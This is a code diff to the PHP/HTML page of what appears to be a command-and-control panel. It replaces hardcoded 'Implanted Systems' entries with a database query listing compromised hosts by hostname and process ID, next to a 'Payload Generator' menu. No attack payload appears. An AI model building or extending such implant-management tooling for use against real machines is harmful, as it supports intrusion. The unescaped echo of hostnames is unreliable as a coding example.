@@ -142,18 +142,33 @@
                             <span>Implanted Systems</span>
                         </a>
                         <ul class="ml-menu">
+                            <!-- 
                             <li>
-                                <a href="">Hunter's MacBook Pro (664)</a> <!-- Where "664" is the PID -->
+                                <a href="">Hunter's MacBook Pro (664)</a>
                             </li>
                             <li>
-                                <a href="">Hunter's MacBook Pro (1238)</a> <!-- Where "1238" is the PID -->
+                                <a href="">Hunter's MacBook Pro (1238)</a>
                             </li>
                             <li>
-                                <a href="">Hunter's MacBook Pro (6890)</a> <!-- Where "6890" is the PID -->
+                                <a href="">Hunter's MacBook Pro (6890)</a>
                             </li>
                             <li>
-                                <a href="">t3ntman's iMac (7364)</a> <!-- Where "7364" is the PID -->
+                                <a href="">t3ntman's iMac (7364)</a>
                             </li>
+                            -->
+                            <?php
+                                $Statement = $DatabaseConnection->prepare("SELECT `hostname`, `process_id` FROM hosts");
+                                $Statement->execute();
+                                $results = $Statement->fetchAll();
+
+                                foreach ($results as $row)
+                                {
+                                    echo "<li>";
+                                    # TO DO: Add in hyperlink with the associated "pid" and "hostname" HTTP GET parameters
+                                    echo "<a href=\"\">" . $row["hostname"] . " (" . $row["process_id"] . ") " . "</a>";
+                                    echo "</li>";
+                                }
+                            ?>
                         </ul>
                     </li>
                     <!-- Payload Generator -->
